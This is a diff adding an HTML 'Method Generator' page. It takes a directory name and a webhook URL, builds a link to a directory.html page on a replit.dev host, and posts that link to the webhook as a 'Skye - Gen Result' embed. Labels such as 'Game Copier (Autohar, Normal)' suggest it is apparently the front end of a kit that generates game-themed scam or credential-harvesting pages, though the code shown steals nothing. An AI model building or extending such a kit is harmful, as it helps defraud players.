@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Method Generator</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <style>
+    /* Custom animations */
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .fade-in {
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    .hover-glow {
+      transition: box-shadow 0.3s ease, transform 0.3s ease;
+    }
+
+    .hover-glow:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 4px 20px rgba(59, 130, 246, 0.6);
+    }
+  </style>
+</head>
+<body class="bg-gradient-to-br from-black via-gray-900 to-gray-800 text-white h-screen flex justify-center items-center">
+
+  <!-- Main Container -->
+  <div class="text-center fade-in">
+    <h1 class="text-4xl font-extrabold mb-4 text-white tracking-wide animate-pulse">✨ Method Generator</h1>
+    <p class="text-gray-400 mb-8">Choose your registration type below:</p>
+
+    <!-- Registration Form -->
+    <div class="bg-gray-900 p-8 rounded-2xl shadow-lg hover-glow max-w-sm mx-auto">
+      <h2 class="text-xl font-semibold mb-6 text-blue-400">Register as Normal</h2>
+
+      <!-- Directory Name Input -->
+      <input 
+        type="text" 
+        placeholder="Directory Name" 
+        id="directory-name"
+        class="w-full p-3 mb-4 bg-gray-800 text-white rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none transition duration-300"
+      >
+
+      <!-- Webhook Input -->
+      <input 
+        type="text" 
+        placeholder="Webhook" 
+        id="webhook-url"
+        class="w-full p-3 mb-4 bg-gray-800 text-white rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none transition duration-300"
+      >
+
+      <!-- Dropdown -->
+      <select 
+        id="registration-type"
+        class="w-full p-3 mb-6 bg-gray-800 text-white rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none transition duration-300">
+        <option>Game Copier (Autohar, Normal)</option>
+        <option>Option 2</option>
+        <option>Option 3</option>
+      </select>
+
+      <!-- Generate Button -->
+      <button 
+        class="w-full py-3 bg-blue-500 text-white font-semibold rounded-lg shadow-md hover:bg-blue-600 hover-glow flex items-center justify-center transition duration-300"
+        onclick="sendDirectory()">
+        <svg class="w-5 h-5 mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+        </svg>
+        Generate
+      </button>
+      <!-- Feedback message -->
+      <div id="feedback" class="mt-4 text-green-400 hidden">Your directory link has been sent to the webhook.</div>
+    </div>
+  </div>
+
+  <script>
+    // Array to store existing directory names and their webhooks
+    let existingDirectories = [];
+
+    function isDirectoryNameUnique(name) {
+      return !existingDirectories.some(dir => dir.name.toLowerCase() === name.toLowerCase());
+    }
+
+    async function sendDirectory() {
+      const directoryName = document.getElementById('directory-name').value;
+      const webhookUrl = document.getElementById('webhook-url').value;
+
+      if (!webhookUrl || !directoryName) {
+        alert('Please enter both directory name and webhook URL.');
+        return;
+      }
+
+      if (!isDirectoryNameUnique(directoryName)) {
+        alert('Directory name already exists. Please choose a different name.');
+        return;
+      }
+
+      const directoryLink = `https://3f0ff1d9-04ba-4e1c-9205-057ed4b770d8-00-29gy66nhibtsp.sisko.replit.dev/directory.html?name=${directoryName}`;
+
+      // Form data payload with embed configuration
+      const payload = {
+        embeds: [{
+          title: "Skye - Gen Result",
+          description: `**Link:**\n${directoryLink}`,
+          color: 3447003 // Hex color code for the embed box
+        }]
+      };
+
+      try {
+        console.log('Sending payload to webhook:', payload);
+        console.log('Webhook URL:', webhookUrl);
+
+        // Send the payload to the webhook URL
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        console.log('Response status:', response.status);
+
+        if (response.ok) {
+          existingDirectories.push({ name: directoryName.toLowerCase(), webhook: webhookUrl });
+          document.getElementById('feedback').classList.remove('hidden');
+
+          // Save directories to localStorage
+          localStorage.setItem('existingDirectories', JSON.stringify(existingDirectories));
+        } else {
+          const errorText = await response.text();
+          console.error('Failed to send directory:', errorText);
+          alert('Failed to send directory. Please check your webhook URL and try again.');
+        }
+      } catch (error) {
+        console.error('An error occurred:', error);
+        alert('An error occurred while sending the directory: ' + error.message);
+      }
+    }
+
+    // Load existing directories from localStorage
+    window.onload = function() {
+      const savedDirectories = localStorage.getItem('existingDirectories');
+      if (savedDirectories) {
+        existingDirectories = JSON.parse(savedDirectories);
+      }
+    }
+  </script>
+
+</body>
+</html>
